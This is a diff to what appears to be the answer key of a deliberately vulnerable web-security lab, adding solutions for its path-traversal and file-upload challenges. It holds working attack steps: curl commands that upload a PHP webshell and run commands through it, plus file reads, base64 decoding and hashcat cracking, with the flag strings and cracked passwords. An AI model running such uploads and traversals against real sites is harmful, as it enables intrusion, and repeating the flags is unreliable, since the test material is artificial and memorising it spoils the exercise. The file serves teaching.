@@ -91,6 +91,9 @@ not known" error, and the blind level forces write-then-read exfiltration.
 
 ## 6. LFI / path traversal  (`index.php?page=`)
 **Answer:** `page` is included with no sanitisation, so `../` escapes the `pages/` directory.
+Decode/crack reps: besides `flag.txt` (plaintext), the same out-of-webroot dir has `flag_b64.txt`
+(`base64 -d`) and `flag_salted.txt` (`admin:<md5>:<salt>` → `hashcat -m 10` → `monkey`); and the hard/expert
+levels inherently return the file `php://filter`-encoded (base64 → decode; rot13 → decode).
 **Command:**
 ```
 # FLAG — a file OUTSIDE the web root, deterministic depth: only 2 ../ (extra ../ are harmless)
@@ -112,6 +115,13 @@ curl -s -F "file=@sh.php" "$U/upload.php"
 curl -s "$U/uploads/sh.php?c=id"
 ```
 **Result:** `uid=...` → RCE. **Reason:** `move_uploaded_file` with the raw client filename, no validation; `uploads/` is servable.
+Post-ex per level reads the flag in a harder form (webshell CWD is `uploads/`, so `../private/`):
+```
+cat ../private/upload_flag.txt                          # easy   -> FLAG{w3bshell_upl0ad_to_rce}
+cat ../private/upload_flag.b64 | base64 -d              # medium -> FLAG{upl0ad_rce_b64_pivot}
+cat ../private/upload_flag.md5                          # hard   -> admin:<md5>  -> hashcat -m 0    -> sunshine
+cat ../private/upload_flag.sha256salt                   # expert -> admin:<sha256>:<salt> -> hashcat -m 1410 -> pokemon
+```
 
 ## 8. Weak CSP + cookie theft  (every page)
 
